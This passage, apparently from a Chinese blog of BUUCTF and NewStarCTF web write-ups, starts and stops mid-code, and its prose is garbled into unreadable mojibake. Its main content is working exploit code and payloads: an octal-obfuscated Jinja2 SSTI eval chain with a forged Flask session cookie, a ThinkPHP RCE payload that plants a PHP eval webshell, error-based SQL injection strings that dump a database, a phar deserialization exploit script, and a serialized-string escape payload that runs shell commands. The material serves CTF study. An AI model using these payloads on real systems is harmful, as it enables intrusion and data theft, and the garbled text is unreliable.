class="string">&quot;&#123;&#123;%print(xxx|attr(\&quot;\&quot;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\145\\\\166\\\\141\\\\154\&quot;\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;</span>.<span class="built_in">format</span>(eval_shell)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">command = <span class="string">&quot;python flask_session_cookie_manager3.py encode -s \&quot;&#123;0&#125;\&quot; -t \&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(secret_key,payload)</span><br><span class="line"><span class="built_in">print</span>(command)</span><br><span class="line"></span><br><span class="line">session_data = subprocess.check_output(command, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"><span class="comment"># linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚</span></span><br><span class="line">session_data = session_data[:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/backdoor&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: session_data&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;</span></span><br><span class="line">result_content = re.search(pattern, res.text, re.S)</span><br><span class="line"><span class="comment"># print(result_content)</span></span><br><span class="line"><span class="keyword">if</span> result_content:</span><br><span class="line">    result = result_content.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;something wrong!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¤ç°å¤±è´¥äº†ï¼Œä¸é“ä¸ºä»€ä¹ˆ</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Final"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Final" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Final"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Final</h1><img src="/2024/03/29/buuctf/buu2/image-20240422170012715.png" class="" title="image-20240422170012715">

<p>ä¼ å‚ä½¿å…¶æŠ¥é”™ï¼Œè·å–ç‰ˆæœ¬å·ï¼Œæ ¹æ®ç‰ˆæœ¬å·æ‰¾åˆ°payloadï¼š<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></p>
<p>ç„¶åå˜é‡sä¼ æ•°æ®<code>captcha</code>ï¼Œå‘åŒ…æ”¹ä¸º<code>POST</code>æ–¹å¼ï¼ˆsystemçœ‹èµ·æ¥æ˜¯è¢«banäº†ï¼Œæ‰€ä»¥çœ‹çœ‹phpinfoï¼‰</p>
<img src="/2024/03/29/buuctf/buu2/image-20240422171446324.png" class="" title="image-20240422171446324">

<p>èƒ½å¤Ÿæ‰§è¡Œï¼Œé‚£å°±æ‰¾ä¸€ä¸‹<code>DOCUMENT_ROOT</code>ï¼Œå®ƒæ˜¯å½“å‰è¿è¡Œçš„è„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼ŒæŠŠé©¬å†™åœ¨é‡Œé¢</p>
<p>payload:<code>_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39; &gt; /var/www/public/shell.php</code></p>
<img src="/2024/03/29/buuctf/buu2/image-20240422174221914.png" class="" title="image-20240422174221914">

<p>è¿™é‡Œæ²¡æœ‰è¯»å–åˆ°flagï¼ŒçŒœæµ‹æ˜¯æƒé™çš„é—®é¢˜</p>
<p>ç”¨èšå‰‘è¿æ¥è¿›å…¥ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ã€‘</p>
<img src="/2024/03/29/buuctf/buu2/image-20240422174738112.png" class="" title="image-20240422174738112">

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><p>è¿™é¢˜æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œ<code>=</code>ï¼Œ<code>=</code>å¯ä»¥è€ƒè™‘ç”¨likeç»•è¿‡ï¼Œç©ºæ ¼å¯ä»¥ç”¨<code>^</code>ç»•è¿‡</p>
<p>å½“ç„¶äº†ï¼Œè¿˜ç¦ç”¨äº†å…¶ä»–ç¬¦å·ï¼Œæ¯”å¦‚è¯´<code>*</code></p>
<p>payloadå¦‚ä¸‹ï¼š</p>
<p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(database()))))%23</code></p>
<p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</code></p>
<p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</code></p>
<p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(password)from(geek.H4rDsq1))))%23</code></p>
<p>ç”±äºflagåªæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œè¯´æ˜åŸæ–‡æœ¬çš„é•¿åº¦è¶…è¿‡é™å®šé•¿åº¦ï¼Œå¯ä»¥è€ƒè™‘ç”¨leftæˆ–rightå‡½æ•°</p>
<img src="/2024/03/29/buuctf/buu2/image-20240424135643946.png" class="" title="image-20240424135643946">

<p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(right(password%2C20))from(geek.H4rDsq1))))%23</code></p>
<img src="/2024/03/29/buuctf/buu2/image-20240424140153927.png" class="" title="image-20240424140153927">

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Unserialize-Again"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Unserialize-Again" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserialize Again"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserialize Again</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜ä¸»è¦è€ƒpharä¼ªåè®®ï¼Œç”±äº<code>file_exists()</code>ä¸­çš„å˜é‡å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶é…åˆpharä¼ªåè®®è¯»å–å†™å…¥çš„æ–‡ä»¶æ¥getshellã€‚</p>
<h2 id="pharæ–‡ä»¶ç”Ÿæˆ"><a href="#pharæ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="pharæ–‡ä»¶ç”Ÿæˆ"></a>pharæ–‡ä»¶ç”Ÿæˆ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$eating</span> = <span class="string">&#x27;cat /f*&#x27;</span>;  </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;true&#x27;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è¿è¡Œçš„æ˜¯<code>__destruct()</code>çš„<code>system</code>ï¼Œå› æ­¤æŠŠeatingå’ŒGodæ”¹äº†å°±å¥½</p>
<h2 id="ä¼ é©¬"><a href="#ä¼ é©¬" class="headerlink" title="ä¼ é©¬"></a>ä¼ é©¬</h2><img src="/2024/03/29/buuctf/buu2/image-20240424144516861.png" class="" title="image-20240424144516861">

<p>ç”±äºåœ¨æ–‡ä»¶ç”Ÿæˆè¿‡ç¨‹ä¸­å†…å®¹è¢«ä¿®æ”¹è¿‡ï¼ˆä¸ºäº†ç»•è¿‡<code>__wakeup()</code>ï¼Œå› æ­¤éœ€è¦æ›´æ¢ä¸€ä¸ªç­¾åï¼Œè¿™é‡Œç”¨åˆ°äº†sha256ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">    f = file1.read()</span><br><span class="line"></span><br><span class="line">s = f[:-<span class="number">40</span>]</span><br><span class="line">s = s.replace(<span class="string">b&#x27;O:5:&quot;story&quot;:2&#x27;</span>,<span class="string">b&#x27;O:5:&quot;story&quot;:3&#x27;</span>)</span><br><span class="line">h = f[-<span class="number">8</span>:]</span><br><span class="line">newfile = s + sha256(s).digest() + h</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;new.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file2:</span><br><span class="line">    file2.write(newfile)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://bd7d412e-1f2f-4257-b51b-8602813e8098.node5.buuoj.cn:81/pairing.php&#x27;</span></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&#x27;pear&#x27;</span>: <span class="string">&#x27;new.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;phar://new.phar&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;new.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file3:</span><br><span class="line">    f = file3.read()</span><br><span class="line">    fi = urllib.parse.quote(f)</span><br><span class="line">    <span class="built_in">print</span>(fi)</span><br><span class="line">    res = requests.post(url=url,params=param,data=fi)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<img src="/2024/03/29/buuctf/buu2/image-20240424152942933.png" class="" title="image-20240424152942933">

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ</h1><p>è¿™é¢˜å°±æ˜¯ååºåˆ—åŒ–ä¸­çš„å­—ç¬¦é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä»£ç ï¼Œå½“æœ‰ä¸€ä¸ªbadè½¬æ¢ä¸ºgoodæ—¶ï¼ŒåŸå­—ç¬¦ä¸²å°±ä¼šå¤šä¸€ä¸ªå­—ç¬¦</p>
<p>å­—ç¬¦ä¸²é€ƒé€¸åŸç†<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">çœ‹çœ‹è¿™é‡Œ</a></p>
<p>äº†è§£å®ŒåŸç†åï¼Œæˆ‘ä»¬è„šæœ¬å¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&#x27;</span>);<span class="comment">//&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;ä¸­å…±æœ‰24ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¦24ä¸ªbad</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2024/03/29/buuctf/buu2/image-20240424155210605.png" class="" title="image-20240424155210605">

<p>payloadä¸º<code>badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code></p>
<img src="/2024/03/29/buuctf/buu2/image-20240424155252108.png" class="" title="image-20240424155252108">

<p>æŠŠå‘½ä»¤æ”¹äº†æ‹¿flagå³å¯</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 